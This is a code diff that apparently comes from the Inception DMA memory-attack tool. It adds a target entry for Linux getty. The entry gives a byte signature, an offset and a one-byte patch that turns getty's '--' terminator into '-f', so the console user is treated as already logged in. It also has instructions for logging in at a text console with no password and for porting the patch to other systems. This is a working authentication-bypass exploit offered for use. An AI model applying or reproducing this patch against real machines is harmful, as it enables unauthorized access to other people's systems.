@@ -522,7 +522,35 @@ targets = [
                     ]
                 )
             ]
-        )
+        ),
+    Target(
+     name='Generic Linux Getty preauthenticated patch',
+     note='The last command parameter to getty "--" is preventing commmand injection in the shell.'
+     ' This can be replace to "-f" which results in the user beeing preauthenticated.'
+     ' Getty is used to login on a text console on most Linux systems. GDM, KDM or pam is not affected.'
+     ' When the patch is applied, switch to a text console (on most ditros using Ctrl+Alt+F2) and login without requiring a password.'
+     ' If you want to target another Linux system; dump the memory, use a hex editor to search for the chunk and'
+     ' enter the pageoffset in the offset field below and rerun inception.',
+     signatures=[
+         Signature(
+             os='Linux',
+             os_versions=['Most'],
+             os_architectures=['x86', 'x64'],
+             executable=None,
+             version=None,
+             md5=None,
+             tag=True,
+             offsets=[0x892],
+             chunks=[
+                 Chunk(
+                     chunk=0x2d2d0025733a206361,
+                     chunkoffset=0x00,
+                     patch=0x66,
+                     patchoffset=0x01)
+                 ]
+             )
+         ]
+     )
     ]
 
 
